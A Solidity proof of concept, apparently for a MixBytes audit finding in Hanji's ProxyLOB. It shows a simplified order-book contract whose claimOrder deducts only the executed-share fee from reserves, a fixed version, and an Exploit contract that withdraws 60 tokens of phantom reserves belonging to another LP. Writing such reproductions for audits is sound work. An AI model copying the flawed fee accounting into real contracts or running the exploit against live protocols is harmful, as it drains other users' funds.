// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Hanji ProxyLOB — MixBytes
    A bid locks quantity * price plus the passive payout fee in
    lobReservesByTokenId. claimOrder(only_claim = false) on a partial fill
    returns the unfilled fee to the LP manager but subtracts only the fee on
    executed shares. Reserves still count that returned fee.

    1,000 shares at 1 token, 10% passive fee, 400 shares filled.
    Unfilled fee is 60 tokens. It is paid back and still sits in reserves,
    so the next reserve withdrawal takes 60 tokens from another LP.
*/

contract Quote {
    string public symbol = "QUOTE";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract ProxyLOB {
    Quote public immutable quote;
    uint256 public passiveCommissionRate;
    uint256 public lobReservesByTokenId;
    uint256 public passiveFeeRemoved;
    uint256 public feeReturned;
    uint256 public phantom;

    constructor(Quote _quote) {
        quote = _quote;
    }

    function placeBid(uint256 shares, uint256 price, uint256 rate) external {
        passiveCommissionRate = rate;
        uint256 value = shares * price;
        uint256 fee = _mulWadUp(value, rate);
        lobReservesByTokenId += value + fee;
        quote.transferFrom(msg.sender, address(this), value + fee);
    }

    function _claimOrder(uint256 executedShares, uint256 totalClaimedShares, uint256 price) internal {
        uint256 executedValue = executedShares * price;
        // @> VULN: the fee removed from lobReservesByTokenId uses executed shares, not the shares whose fee is returned
        uint256 passiveFee = _mulWadUp(executedValue, passiveCommissionRate);
        uint256 returnedValue = totalClaimedShares * price;
        uint256 feeOnClaim = _mulWadUp(returnedValue, passiveCommissionRate);
        uint256 unfilledValue = returnedValue - executedValue;
        uint256 unfilledFee = feeOnClaim - passiveFee;
        passiveFeeRemoved = passiveFee;
        feeReturned = unfilledFee;
        lobReservesByTokenId -= executedValue + passiveFee + unfilledValue;
        quote.transfer(address(uint160(1)), executedValue);
        quote.transfer(address(uint160(2)), passiveFee);
        quote.transfer(msg.sender, unfilledValue + unfilledFee);
        phantom = lobReservesByTokenId;
    }

    function claimOrder(uint256 executedShares, uint256 totalClaimedShares, uint256 price, bool onlyClaim) external {
        require(!onlyClaim, "cancel");
        _claimOrder(executedShares, totalClaimedShares, price);
    }

    function withdrawReserves(address to) external {
        uint256 amount = lobReservesByTokenId;
        lobReservesByTokenId = 0;
        quote.transfer(to, amount);
    }

    function _mulWadUp(uint256 x, uint256 y) internal pure returns (uint256) {
        return (x * y + 1e18 - 1) / 1e18;
    }
}

contract ProxyLOBFixed {
    Quote public immutable quote;
    uint256 public passiveCommissionRate;
    uint256 public lobReservesByTokenId;

    constructor(Quote _quote) {
        quote = _quote;
    }

    function placeBid(uint256 shares, uint256 price, uint256 rate) external {
        passiveCommissionRate = rate;
        uint256 value = shares * price;
        uint256 fee = _mulWadUp(value, rate);
        lobReservesByTokenId += value + fee;
        quote.transferFrom(msg.sender, address(this), value + fee);
    }

    function claimOrder(uint256 executedShares, uint256 totalClaimedShares, uint256 price, bool onlyClaim) external {
        require(!onlyClaim, "cancel");
        uint256 executedValue = executedShares * price;
        uint256 returnedValue = totalClaimedShares * price;
        uint256 passiveFee = _mulWadUp(returnedValue, passiveCommissionRate);
        uint256 executedFee = _mulWadUp(executedValue, passiveCommissionRate);
        uint256 unfilledValue = returnedValue - executedValue;
        uint256 unfilledFee = passiveFee - executedFee;
        lobReservesByTokenId -= returnedValue + passiveFee;
        quote.transfer(address(uint160(1)), executedValue);
        quote.transfer(address(uint160(2)), executedFee);
        quote.transfer(msg.sender, unfilledValue + unfilledFee);
    }

    function _mulWadUp(uint256 x, uint256 y) internal pure returns (uint256) {
        return (x * y + 1e18 - 1) / 1e18;
    }
}

contract Exploit {
    Quote public quote;
    ProxyLOB public lob;
    uint256 public stolen;

    constructor() {
        quote = new Quote();
        lob = new ProxyLOB(quote);
    }

    function run() external {
        quote.mint(address(lob), 60 ether);
        quote.mint(address(this), 1_100 ether);
        quote.approve(address(lob), 1_100 ether);
        lob.placeBid(1_000, 1 ether, 0.1 ether);
        lob.claimOrder(400, 1_000, 1 ether, false);
        stolen = lob.phantom();
        lob.withdrawReserves(msg.sender);
        require(lob.passiveFeeRemoved() == 40 ether, "removed");
        require(lob.feeReturned() == 60 ether, "returned");
        require(stolen == 60 ether, "phantom");
        require(quote.balanceOf(msg.sender) == 60 ether, "stolen");
        require(quote.balanceOf(address(lob)) == 0, "other lp wiped");
    }
}
